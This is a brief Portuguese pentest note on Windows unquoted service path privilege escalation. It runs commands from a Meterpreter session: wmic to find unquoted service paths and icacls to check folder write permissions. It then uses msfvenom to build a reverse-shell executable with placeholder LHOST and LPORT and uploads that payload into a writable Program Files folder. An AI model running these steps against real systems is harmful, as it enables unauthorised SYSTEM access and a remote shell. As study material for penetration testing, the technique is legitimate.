-----
### Unquoted Path

* Quando um serviço é criado cujo caminho executável comtém espaços e não está entre aspas.
* Pode levar a uma vulnerabilidade conhecida como Unquoted Path, que permite ao usuário obter privilégios de SYSTEM.
* Se o serviço não estiver entre aspas e tiver espaços, ele trará o espaço como uma quebra e passará o resto do caminho do serviço como um argumento.

  Exemplos: C:\Program Files\First Subfolder\Second  Subfolder\Third  Subfolder\Executable.exe

O processo de Exploração
  
* Ter permissão de escrita no contexto do usuário
* Deixar o executável malicioso nessa pasta para obter um shell reverso
* Enumerar um serviço vulnerável e também enumerar permissões de gravação na pasta

~~~
exploit(multi/handler) >sessions -i 2
meterpreter > shell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
~~~

O comando wmic acima, verifica todos os serviços que tem espaços e não tem aspas.

~~~
icacls "C:\Program Files"
~~~

O comando acima verifica permissões de escrita em uma pasta.

~~~
msfvenom -p windows/shell_reverse_tcp  LHOST=XXXX LPORT=XXXX -f exe -o B.exe
upload B.exe  "C:\\Program Files\\A Subfolder"
~~~






